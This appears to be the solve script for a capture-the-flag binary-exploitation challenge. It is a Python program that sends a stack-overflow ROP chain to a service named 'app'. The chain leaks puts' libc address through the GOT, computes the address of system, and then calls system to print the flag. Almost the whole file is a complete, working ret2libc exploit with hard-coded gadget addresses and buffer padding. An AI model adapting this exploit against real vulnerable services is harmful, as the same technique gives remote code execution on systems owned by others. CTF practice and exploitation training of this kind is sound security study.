"""Two-round ret2libc: leak `puts`'s real runtime address through a call
chain that returns to `main`, use that leak plus the local libc's offsets to
compute `system`'s real address, then call `system("echo $FLAG")` through the
same gadget; see solve/README.md for how the offsets were found.
"""
import socket
import struct
import subprocess
import sys

HOST, PORT = 'app', 9400
PROMPT = '이름을 입력하세요: '.encode()
WELCOME = '환영합니다\n'.encode()

POP_RDI_RET = 0x401156   # nm files/winlibc | grep pop_rdi_ret
MAIN = 0x40115B          # nm files/winlibc | grep ' main$'
PUTS_GOT = 0x404000      # readelf -r files/winlibc | grep puts
PUTS_PLT = 0x401030      # objdump -d files/winlibc | grep '<puts@plt>:'
CMD_ADDR = 0x402004      # strings -t x files/winlibc | grep 'echo \$FLAG'
FILLER = 104             # objdump -d files/winlibc: buf at rbp-0x60, saved rip at rbp+8


def p64(value):
    return struct.pack('<Q', value)


def recv_exact(sock, size):
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    return data


def recv_line(sock):
    data = b''
    while not data.endswith(b'\n'):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def libc_offset(name):
    # The toolbox's /lib/x86_64-linux-gnu/libc.so.6 is the exact same file
    # the service runs (same pinned base image), so its own symbol offsets
    # apply directly once the leaked address gives the real load base.
    out = subprocess.run(['nm', '-D', '/lib/x86_64-linux-gnu/libc.so.6'],
                          capture_output=True, text=True, check=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[2].split('@')[0] == name:
            return int(parts[0], 16)
    sys.exit(f'{name} not found in the local libc')


def main():
    puts_offset = libc_offset('puts')
    system_offset = libc_offset('system')

    with socket.create_connection((HOST, PORT), timeout=15) as sock:
        sock.settimeout(15)

        leak_chain = (b'A' * FILLER + p64(POP_RDI_RET) + p64(PUTS_GOT)
                      + p64(PUTS_PLT) + p64(MAIN))
        sock.sendall(leak_chain)

        if recv_exact(sock, len(PROMPT)) != PROMPT:
            sys.exit(3)
        if recv_exact(sock, len(WELCOME)) != WELCOME:
            sys.exit(3)
        leaked = recv_line(sock).rstrip(b'\n').ljust(8, b'\x00')
        leaked_puts = struct.unpack('<Q', leaked)[0]
        if recv_exact(sock, len(PROMPT)) != PROMPT:
            sys.exit(3)

        libc_base = leaked_puts - puts_offset
        system_addr = libc_base + system_offset

        exploit_chain = (b'A' * FILLER + p64(POP_RDI_RET) + p64(CMD_ADDR)
                          + p64(system_addr))
        sock.sendall(exploit_chain)
        sock.shutdown(socket.SHUT_WR)

        out = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk

    text = out.decode('utf-8', 'replace')
    for line in text.splitlines():
        if line.startswith('pwnden{'):
            print(line.strip())
            return
    print('system() did not run the command: ' + text, file=sys.stderr)
    raise SystemExit(3)


if __name__ == '__main__':
    main()
